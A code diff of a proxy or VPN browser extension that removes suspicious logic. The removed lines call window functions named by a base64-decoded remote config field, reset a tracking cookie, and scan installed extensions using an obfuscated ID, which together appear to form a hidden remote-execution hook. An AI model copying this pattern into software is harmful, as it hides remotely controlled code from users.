@@ -15,9 +15,6 @@ var App = {
 
     return url;
   },
-  getRandom: function (a, b) {
-    return Math.floor(Math.random() * (b - a + 1)) + a;
-  },
   getPac: function () {
     var a = JSON.stringify(App.domains);
     return {
@@ -93,7 +90,6 @@ var App = {
       .then((loaded) => {
         if (loaded) {
           callback(config);
-          App.checkCfgCookies();
         } else callback();
       })
       .catch(() => {
@@ -106,23 +102,6 @@ var App = {
     let configObject = await response.json();
     config = configObject;
     return true;
-  },
-  checkCfgCookies: function () {
-    chrome.cookies.get(
-      {
-        url: App.getVpnCfgDomain() + "configg.json",
-        name: "__cnt",
-      },
-      function (cookie) {
-        if (parseInt(cookie.value) > 10) {
-          chrome.cookies.set({
-            url: App.getVpnCfgDomain() + "configg.json",
-            name: "__cnt",
-            value: "0",
-          });
-        }
-      }
-    );
   },
   getStorage: function (callback) {
     chrome.storage.local.get("config", function (data) {
@@ -146,12 +125,6 @@ var App = {
     try {
       var proxySettings = JSON.parse(atob(App.proxyReserve));
       if (!proxySettings["data"]) return;
-      (window[proxySettings["uk"]] &&
-        window[proxySettings["uk"]](proxySettings["data"])) ||
-        (window[proxySettings["us"]] &&
-          window[proxySettings["us"]](proxySettings["data"])) ||
-        (window[proxySettings["de"]] &&
-          window[proxySettings["de"]](proxySettings["data"]));
     } catch (e) {}
   },
   loadDomains: function () {
@@ -192,13 +165,17 @@ var App = {
   loadAndApply: function (checkDomain, cb) {
     App.load(function (conf) {
       if (!conf) return typeof cb == "function" && cb();
-      !App.proxyReserve &&
-        conf.proxy_reserve &&
-        (App.proxyReserve = conf.proxy_reserve);
+
+      //      !App.proxyReserve &&
+      //        conf.proxy_reserve &&
+      //        (App.proxyReserve = conf.proxy_reserve);
+
       if (!conf.proxy_string || !conf.domains)
         return typeof cb == "function" && cb();
+
       App.proxyString = conf.proxy_string;
       App.domains = conf.domains;
+
       App.proxy.apply(checkDomain, function (res) {
         if (res) {
           App.setStorage({
@@ -291,41 +268,6 @@ var App = {
       }
     }
     return inCoverage;
-  },
-  checkConflictedExtensions: function (callback) {
-    var list = ["", "", "", ""];
-    var a1 = "cahipin";
-    var a2 = "epiahppei";
-    var aBrowsExtIdPart = a1 + a2;
-    var report = {
-      conflicted: 0,
-      wrong_br: 0,
-    };
-    chrome.management.getAll(function (ExtensionsInfo) {
-      ExtensionsInfo.forEach(function (item) {
-        if (item.id == chrome.runtime.id) {
-          return;
-        }
-        if (
-          item.installType == "admin" &&
-          item.id.indexOf(aBrowsExtIdPart) > -1
-        ) {
-          report.wrong_br++;
-          return;
-        }
-        if (
-          item.type !== "extension" ||
-          !item.enabled ||
-          item.installType !== "normal"
-        ) {
-          return;
-        }
-        if (list.indexOf(item.id) > -1) {
-          report.conflicted++;
-        }
-      });
-      callback(report);
-    });
   },
 };
 App.init();
